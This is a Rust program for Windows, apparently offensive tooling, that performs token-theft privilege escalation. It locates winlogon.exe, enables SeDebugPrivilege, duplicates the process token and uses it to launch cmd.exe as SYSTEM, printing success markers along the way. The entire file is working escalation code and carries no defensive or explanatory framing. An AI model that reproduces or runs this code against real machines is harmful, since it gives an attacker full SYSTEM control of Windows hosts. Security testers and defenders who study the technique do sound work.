use std::{
    ffi::OsStr,
    mem::zeroed,
    os::{raw::c_void, windows::ffi::OsStrExt},
    ptr::null_mut,
};

use windows_sys::{
    Wdk::System::SystemInformation::{NtQuerySystemInformation, SystemProcessInformation},
    Win32::{
        Foundation::{
            CloseHandle, ERROR_NOT_ALL_ASSIGNED, GetLastError, STATUS_INFO_LENGTH_MISMATCH,
        },
        Security::{
            AdjustTokenPrivileges, DuplicateTokenEx, ImpersonateLoggedOnUser, RevertToSelf,
            SE_PRIVILEGE_ENABLED, SecurityImpersonation, TOKEN_ADJUST_PRIVILEGES, TOKEN_DUPLICATE,
            TOKEN_PRIVILEGES, TOKEN_QUERY, TokenImpersonation,
        },
        System::{
            Threading::{
                CREATE_NEW_CONSOLE, CreateProcessWithTokenW, GetCurrentProcess, LOGON_WITH_PROFILE,
                OpenProcess, OpenProcessToken, PROCESS_INFORMATION, PROCESS_QUERY_INFORMATION,
                STARTUPINFOW,
            },
            WindowsProgramming::SYSTEM_PROCESS_INFORMATION,
        },
    },
};

#[allow(non_snake_case)]
fn NT_SUCCESS(status: i32) -> bool {
    status >= 0
}

pub const MAXIMUM_ALLOWED: u32 = 0x02000000;

fn get_pid(proc_name: &str) -> u32 {
    let mut pid: u32 = 0;

    unsafe {
        let mut return_length: u32 = 0;
        let status =
            NtQuerySystemInformation(SystemProcessInformation, null_mut(), 0, &mut return_length);

        if status != STATUS_INFO_LENGTH_MISMATCH {
            println!("[-] Failed to query system information. Status: {}", status);
            return pid;
        }

        let buffer_size = return_length as usize;
        let buffer: Vec<u8> = vec![0; buffer_size];

        let status = NtQuerySystemInformation(
            SystemProcessInformation,
            buffer.as_ptr() as *mut c_void,
            buffer_size as u32,
            &mut return_length,
        );

        if !NT_SUCCESS(status) {
            println!("[-] Failed to query system information. Status: {}", status);
            return pid;
        }

        let mut proc_info = buffer.as_ptr() as *const SYSTEM_PROCESS_INFORMATION;

        loop {
            if !(*proc_info).ImageName.Buffer.is_null()
                && proc_name.eq_ignore_ascii_case(
                    String::from_utf16_lossy(std::slice::from_raw_parts(
                        (*proc_info).ImageName.Buffer,
                        (*proc_info).ImageName.Length as usize / 2,
                    ))
                    .as_str(),
                )
            {
                pid = (*proc_info).UniqueProcessId as u32;
                break;
            }

            if (*proc_info).NextEntryOffset == 0 {
                break;
            }

            proc_info = (proc_info as *const u8).add((*proc_info).NextEntryOffset as usize)
                as *const SYSTEM_PROCESS_INFORMATION;
        }
    }

    pid
}

fn enable_sedebug_privilege() -> bool {
    unsafe {
        let mut token_handle: *mut c_void = null_mut();

        if OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &mut token_handle,
        ) == 0
        {
            println!("[-] Failed to open process token.");
            return false;
        }

        let mut token_privileges = zeroed::<TOKEN_PRIVILEGES>();

        token_privileges.PrivilegeCount = 1;
        token_privileges.Privileges[0].Luid.LowPart = 20; // SeDebugPrivilege LUID LowPart
        token_privileges.Privileges[0].Luid.HighPart = 0; //
        token_privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if AdjustTokenPrivileges(
            token_handle,
            0,
            &mut token_privileges,
            size_of::<TOKEN_PRIVILEGES>() as u32,
            null_mut(),
            null_mut(),
        ) == 0
        {
            println!("[-] Failed to adjust token privileges.");
            return false;
        }

        if GetLastError() == ERROR_NOT_ALL_ASSIGNED {
            println!("[-] The token does not have the specified privilege.");
            return false;
        }
    }

    true
}

fn impersonate_system(pid: u32) -> bool {
    unsafe {
        let mut token_handle: *mut c_void = null_mut();
        let mut dup_token: *mut c_void = null_mut();
        let proc_handle = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid);

        if proc_handle.is_null() {
            println!("[-] Failed to open process with PID {}.", pid);
            return false;
        }

        if OpenProcessToken(
            proc_handle,
            TOKEN_DUPLICATE | TOKEN_QUERY,
            &mut token_handle,
        ) == 0
        {
            println!("[-] Failed to open process token.");
            return false;
        }

        if DuplicateTokenEx(
            token_handle,
            MAXIMUM_ALLOWED,
            null_mut(),
            SecurityImpersonation,
            TokenImpersonation,
            &mut dup_token,
        ) == 0
        {
            println!("[-] Failed to duplicate token.");
            return false;
        }

        if ImpersonateLoggedOnUser(dup_token) == 0 {
            println!("[-] Failed to impersonate user.");
            return false;
        }

        let mut si = zeroed::<STARTUPINFOW>();
        si.cb = size_of::<STARTUPINFOW>() as u32;

        let mut pi = zeroed::<PROCESS_INFORMATION>();

        let proc_name: Vec<u16> = OsStr::new("C:\\Windows\\System32\\cmd.exe")
            .encode_wide()
            .chain(Some(0))
            .collect();

        if CreateProcessWithTokenW(
            dup_token,
            LOGON_WITH_PROFILE,
            proc_name.as_ptr(),
            null_mut(),
            CREATE_NEW_CONSOLE,
            null_mut(),
            null_mut(),
            &mut si,
            &mut pi,
        ) == 0
        {
            println!("[-] Failed to create process with token.");
            return false;
        }

        println!("[+] Successfully impersonated SYSTEM.");

        if RevertToSelf() == 0 {
            println!("[-] Failed to revert to self.");
            return false;
        }

        CloseHandle(dup_token);
        CloseHandle(token_handle);
        CloseHandle(proc_handle);
    }

    true
}

fn main() {
    let proc_name = "winlogon.exe";

    let pid = get_pid(proc_name);

    if pid == 0 {
        println!("[-] Process '{}' not found.", proc_name);
        return;
    }

    println!("[+] Found '{}', PID: {}", proc_name, pid);

    if !enable_sedebug_privilege() {
        println!("[-] Failed to enable SeDebugPrivilege.");
        return;
    }

    println!("[+] SeDebugPrivilege enabled successfully.");

    if !impersonate_system(pid) {
        println!("[-] Failed to impersonate SYSTEM.");
        return;
    }
}
